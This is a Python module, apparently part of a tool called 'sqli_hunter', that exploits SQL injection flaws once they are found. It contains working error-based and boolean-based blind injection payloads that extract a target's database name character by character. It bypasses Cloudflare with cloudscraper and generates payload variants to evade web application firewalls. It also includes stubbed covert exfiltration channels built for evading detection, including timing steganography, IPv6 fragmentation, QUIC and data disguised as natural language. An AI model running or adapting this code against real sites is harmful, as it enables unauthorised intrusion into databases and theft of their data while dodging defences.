# -*- coding: utf-8 -*-
"""
Exploitation Engine.
This module contains the logic to extract data from a target once a
vulnerability has been identified. It uses a multi-stage, multi-technique,
and learning-based approach to bypass advanced defenses.
"""
from urllib.parse import urlparse
from playwright.async_api import BrowserContext, Error, Page
import re
import asyncio
import cloudscraper
from simhash import Simhash
import json
import os
import time
import base64
from sqli_hunter.utils import get_logger
from rich.table import Table
from rich.console import Console
import random
import string
from sqli_hunter.rl_payload_generator import RLPayloadGenerator
from sqli_hunter.polymorphic_engine import PolymorphicEngine
import dns.asyncresolver
import websockets
from aioquic.asyncio import serve, connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3_ALPN
from aioquic.h3.events import HeadersReceived, DataReceived, H3Event
import ssl
from typing import Optional, Dict, List, cast
import numpy as np


try:
    from transformers import AutoTokenizer, AutoModel
    from gymnasium import spaces
    import gymnasium as gym
    from stable_baselines3 import PPO
    from stable_baselines3.common.vec_env import DummyVecEnv
except Exception:  # pragma: no cover - transformers may be missing
    AutoTokenizer = None
    AutoModel = None
    gym = None
    spaces = None
    PPO = None
    DummyVecEnv = None


logger = get_logger("exploiter")
CACHE_FILE = "exploit_cache.json"
CONFIG_FILE = "config.json"
TIME_DELAY_SECONDS = 3


class LLMCodec:
    """
    An advanced codec using Language Models to encode data or rephrase payloads
    to evade detection.
    """
    def __init__(self):
        self.tokenizer = None
        self.model = None
        self.text_generator = None
        # The following code attempts to load models from Hugging Face,
        # which is not possible in this sandboxed environment.
        # Disabling it to prevent network errors as requested by the user.
        # if AutoTokenizer and AutoModel:
        #     try:
        #         from transformers import pipeline
        #         self.tokenizer = AutoTokenizer.from_pretrained("distilbert-base-uncased", local_files_only=True)
        #         self.model = AutoModel.from_pretrained("distilbert-base-uncased", local_files_only=True)
        #         self.text_generator = pipeline('text-generation', model='distilgpt2', tokenizer='distilgpt2')
        #     except Exception as e:
        #         logger.error(f"Failed to load LLM models: {e}")

    def encode(self, text: str) -> str:
        """Fallback simple base64 encoding."""
        return base64.b64encode(text.encode()).decode()

    def encode_as_natural_language(self, data: str) -> str:
        """Encodes data into a plausible-looking natural language sentence."""
        if not self.text_generator:
            return self.encode(data)

        templates = [
            f"Please provide a summary for the item: {data}",
            f"What is the current status of project code '{data}'?",
            f"Generate a detailed report for the '{data}' department.",
        ]
        prompt = random.choice(templates)

        try:
            generated = self.text_generator(prompt, max_length=len(prompt) + 25, num_return_sequences=1)
            encoded_text = generated[0]['generated_text']
            logger.info(f"Encoded exfil data '{data}' into NL: '{encoded_text}'")
            return encoded_text
        except Exception as e:
            logger.error(f"LLM NL encoding failed: {e}")
            return self.encode(data)


class TimingSteganographer:
    """
    A mock implementation of a steganographic packetizer that encodes data
    into the timing delays between packets.
    """
    def __init__(self, base_delay=0.1, zero_delay=0.01, one_delay=0.02):
        self.base_delay = base_delay
        self.bit_delays = {'0': zero_delay, '1': one_delay}

    def _data_to_bits(self, data: str) -> str:
        """Converts a string into its binary representation."""
        return ''.join(format(ord(char), '08b') for char in data)

    async def exfiltrate(self, data: str):
        """Simulates exfiltrating data by sleeping for specific durations."""
        bits = self._data_to_bits(data)
        logger.info(f"Steganographically exfiltrating '{data}' as {len(bits)} bits.")

        for bit in bits:
            delay = self.base_delay + self.bit_delays[bit]
            await asyncio.sleep(delay)

        logger.info("Steganographic exfiltration simulation complete.")
        return True


# Mappings for RL environment state representation
WAF_MAP = {"None": 0, "Cloudflare": 1, "AWS WAF": 2, "Imperva": 3, "Other": 4}
DB_MAP = {"None": 0, "MySQL": 1, "PostgreSQL": 2, "MSSQL": 3, "Oracle": 4, "Other": 5}


class ChannelSelectionEnv(gym.Env if gym else object):
    """
    A custom Gymnasium environment for selecting the best exfiltration channel.
    """
    def __init__(self, channels: List[str], context: Dict[str, str]):
        super(ChannelSelectionEnv, self).__init__()
        self.channels = channels
        self.action_space = spaces.Discrete(len(self.channels))
        self.observation_space = spaces.MultiDiscrete([len(WAF_MAP), len(DB_MAP)])
        self.context = context
        self.state = self._get_state_from_context()

    def _get_state_from_context(self) -> np.ndarray:
        waf_id = WAF_MAP.get(self.context.get("waf"), WAF_MAP["Other"])
        db_id = DB_MAP.get(self.context.get("db"), DB_MAP["Other"])
        return np.array([waf_id, db_id], dtype=np.int64)

    def reset(self, seed=None, options=None):
        if gym:
            super().reset(seed=seed)
        self.state = self._get_state_from_context()
        return self.state, {}

    def step(self, action: int):
        reward = 0
        terminated = True
        return self.state, reward, terminated, False, {"action_name": self.channels[action]}


class RLChannelSelector:
    """
    Manages a Stable Baselines3 PPO agent for dynamic exfiltration channel selection.
    """
    MODEL_PATH = "ppo_channel_selector.zip"

    def __init__(self, channels: List[str], context: Dict[str, str], force_training: bool = False):
        self.channels = channels
        self.env = DummyVecEnv([lambda: ChannelSelectionEnv(self.channels, context)]) if DummyVecEnv else None

        if self.env and PPO and os.path.exists(self.MODEL_PATH) and not force_training:
            logger.info(f"Loading pre-trained RL agent from {self.MODEL_PATH}")
            self.model = PPO.load(self.MODEL_PATH, self.env)
        elif self.env and PPO:
            logger.info("Creating a new PPO agent for channel selection.")
            self.model = PPO("MlpPolicy", self.env, verbose=0, n_steps=16, batch_size=4, n_epochs=4)
        else:
            self.model = None

    def predict(self) -> int:
        if not self.model: return random.randint(0, len(self.channels) -1)
        obs = self.env.reset()
        action, _ = self.model.predict(obs, deterministic=True)
        return action[0]

    def learn(self, action: int, reward: float):
        if not self.model: return
        self.model.learn(total_timesteps=1)
        self.model.save(self.MODEL_PATH)


class MockIPv6Fragmenter:
    """Mocks IPv6 fragmentation exfiltration."""
    def __init__(self, target_ip: str, data_to_exfil: str):
        self.target_ip = target_ip
        self.data_to_exfil = data_to_exfil.encode('utf-8')
        self.fragment_size = 4
    def _encode_data(self):
        return [int.from_bytes(self.data_to_exfil[i:i+self.fragment_size], 'big') for i in range(0, len(self.data_to_exfil), self.fragment_size)]
    async def send_packets(self):
        self._encode_data()
        await asyncio.sleep(0.1)
        return True


class QuicExfilReceiver(asyncio.Protocol):
    """Protocol for the mock QUIC exfiltration server."""
    def __init__(self):
        self.received_data = asyncio.Future()
        self._transport = None
    def connection_made(self, transport): self._transport = transport
    def h3_event_received(self, event: H3Event):
        if isinstance(event, DataReceived) and not self.received_data.done():
            self.received_data.set_result(event.data)
    def connection_lost(self, exc):
        if not self.received_data.done():
            self.received_data.set_exception(exc or ConnectionError("Connection lost"))


class Exploiter:
    """Handles data extraction using various techniques."""
    def __init__(self, browser_context: BrowserContext):
        self.context = browser_context
        self.console = Console()
        self.variable_name = '@' + ''.join(random.choices(string.ascii_lowercase, k=4))
        self.cache = self._load_cache()
        self.config = self._load_config()
        self.rl_generator = RLPayloadGenerator()
        self.text_encoder = LLMCodec()
        self.channel_selector = None
        self.polymorphic_engine = PolymorphicEngine()
        self.scraper = cloudscraper.create_scraper()

    async def _send_request(self, url: str, method: str = "GET", params: dict = None, data: dict = None, timeout: int = 30) -> tuple[str | None, float]:
        start_time = time.time()
        try:
            def sync_req():
                if method.upper() == "POST":
                    return self.scraper.post(url, data=data, params=params, timeout=timeout)
                else:
                    return self.scraper.get(url, params=params, timeout=timeout)

            response = await asyncio.to_thread(sync_req)
            duration = time.time() - start_time
            return response.text, duration
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Request failed: {e}")
            return None, duration

    def _load_cache(self) -> dict:
        if os.path.exists(CACHE_FILE):
            try:
                with open(CACHE_FILE, 'r') as f: return json.load(f)
            except (IOError, json.JSONDecodeError): return {}
        return {}

    def _save_cache(self):
        try:
            with open(CACHE_FILE, 'w') as f: json.dump(self.cache, f, indent=4)
        except IOError: logger.error("Failed to save exploit cache.")

    def _load_config(self) -> dict:
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f: return json.load(f)
            except (IOError, json.JSONDecodeError): return {"dns": {"enabled": False}}
        return {"dns": {"enabled": False}}

    def _encode_side_channel_data(self, data: str) -> str:
        if random.random() < 0.5:
            return self.text_encoder.encode(data)
        else:
            return self.text_encoder.encode_as_natural_language(data)

    def _reward_cache(self, cache_key: str, channel: str):
        entry = self.cache.setdefault(cache_key, {"type": channel, "reward": 0.0})
        entry["type"], entry["reward"] = channel, entry["reward"] + 1.0
        self._save_cache()

    def _get_leak_techniques(self) -> list[dict]:
        """Returns error-based techniques that leak data in the error message."""
        regex = r"converting the varchar value '([^']*)' to data type int"
        return [
            {"name": "DIRECT_CAST", "payload": " AND 1=CAST(({query}) AS INT)--", "regex": regex},
            {"name": "STACKED_CAST", "payload": ";DECLARE {var} VARCHAR(8000); SET {var} = ({query}); SELECT CAST({var} AS INT)--", "regex": regex},
        ]

    async def extract_data_error_based(self, vuln_details: dict, cache_key: str) -> dict | None:
        self.console.print("\n[bold cyan]--- Trying Error-Based Exploitation with Polymorphic Engine ---[/bold cyan]")
        url, method, param = vuln_details['url'], vuln_details['method'], vuln_details['parameter']

        request_data_list = vuln_details.get('request_data', {}).get('data', {})
        request_data = {k: v[0] if isinstance(v, list) else v for k, v in request_data_list.items()}

        items_to_extract = {"database": "SELECT DB_NAME()"}
        extracted_data = {}
        var_name = self.variable_name
        original_payload_prefix = vuln_details.get('payload', "'")

        for item_name, query in items_to_extract.items():
            self.console.print(f"  [*] Attempting to extract [yellow]{item_name}[/yellow]...")
            tech = self._get_leak_techniques()[0]
            if tech['name'] != 'DIRECT_CAST': return None

            base_payload = tech["payload"].format(query=query, var=var_name)
            payload_variations = self.polymorphic_engine.generate(base_payload, num_variations=25)
            if not payload_variations: return None

            optimal_payload = self.polymorphic_engine.select_optimal(payload_variations)
            final_payload = original_payload_prefix + optimal_payload

            injected_data = request_data.copy()
            injected_data[param] = final_payload

            body, _ = await self._send_request(url, method, params=injected_data if method == "GET" else None, data=injected_data if method == "POST" else None)

            item_extracted = False
            if body:
                match = re.search(tech['regex'], body, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    extracted_data[item_name] = value
                    item_extracted = True

            if not item_extracted: return None

        return extracted_data

    async def extract_data_boolean_based(self, vuln_details: dict, cache_key: str) -> dict | None:
        self.console.print("\n[bold cyan]--- Trying Boolean-Based Blind Exploitation ---[/bold cyan]")

        url = vuln_details['url']
        method = vuln_details['method']
        param_to_exploit = vuln_details['parameter']

        request_params_list = vuln_details.get('request_data', {}).get('params', {})
        request_params = {k: v[0] if isinstance(v, list) else v for k, v in request_params_list.items()}
        original_payload = vuln_details.get('payload', "'")

        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

        self.console.print("  [*] Establishing baseline for 'True' response...")
        true_request_args = request_params.copy()
        true_request_args[param_to_exploit] = original_payload

        true_body, _ = await self._send_request(base_url, method, params=true_request_args)

        if not true_body:
            self.console.print("  [bold red][-] Failed to get a baseline 'True' response.[/bold red]")
            return None

        try:
            true_hash = Simhash(true_body)
        except OverflowError:
             self.console.print("  [bold red][-] Simhash calculation failed on baseline response. Cannot proceed.[/bold red]")
             return None

        items_to_extract = {"database": "DATABASE()"}
        extracted_data = {}

        for item_name, query in items_to_extract.items():
            self.console.print(f"  [*] Attempting to extract [yellow]{item_name}[/yellow]...")

            data_length = 0
            for i in range(1, 33):
                payload = f"{original_payload} AND LENGTH(({query})) = {i}"
                payload_args = request_params.copy()
                payload_args[param_to_exploit] = payload
                body, _ = await self._send_request(base_url, method, params=payload_args)
                try:
                    if body and true_hash.distance(Simhash(body)) < 5:
                        data_length = i
                        self.console.print(f"    [+] Found length of {item_name}: {data_length}")
                        break
                except OverflowError:
                    continue

            if data_length == 0:
                self.console.print(f"    [-] Could not determine length of {item_name}.")
                continue

            result = ""
            self.console.print(f"    [*] Extracting {item_name}...")
            from rich.progress import track
            for i in track(range(1, data_length + 1), description="    "):
                low, high = 32, 126
                while low <= high:
                    mid = (low + high) // 2
                    if mid < 32: low = 32; break
                    payload = f"{original_payload} AND ASCII(SUBSTRING(({query}), {i}, 1)) > {mid}"
                    payload_args = request_params.copy()
                    payload_args[param_to_exploit] = payload
                    body, _ = await self._send_request(base_url, method, params=payload_args)

                    is_true = False
                    try:
                        if body and true_hash.distance(Simhash(body)) < 5:
                           is_true = True
                    except OverflowError:
                        is_true = False

                    if is_true:
                        low = mid + 1
                    else:
                        high = mid - 1

                found_char_code = low
                if 32 <= found_char_code <= 126: result += chr(found_char_code)
                else: result += '?'

            self.console.print(f"    [bold green][+] SUCCESS! Extracted {item_name}: {result}[/bold green]")
            extracted_data[item_name] = result

        return extracted_data if extracted_data else None

    async def auto_extract(self, vuln_details: dict, cache_key: str) -> dict | None:
        vuln_type = vuln_details.get("type", "")
        if "Error-Based" in vuln_type:
            return await self.extract_data_error_based(vuln_details, cache_key)
        elif "Boolean-Based" in vuln_type:
            return await self.extract_data_boolean_based(vuln_details, cache_key)
        else:
            self.console.print(f"[yellow]Warning: No specific exploiter for type '{vuln_type}'.[/yellow]")
            return None

    async def extract_data(self, vuln_details: dict):
        cache_key = f"{vuln_details['method']}::{vuln_details['url']}::{vuln_details['parameter']}"
        final_result = await self.auto_extract(vuln_details, cache_key)

        if final_result:
            self.console.print("\n[bold green]--- Exploitation Complete ---[/bold green]")
            table = Table(title="Extracted Information")
            table.add_column("Item", style="cyan"); table.add_column("Value", style="magenta")
            for key, value in final_result.items():
                table.add_row(key, value)
            self.console.print(table)
        else:
            self.console.print("\n[bold red]--- Exploitation Failed: All techniques were defeated. ---[/bold red]")
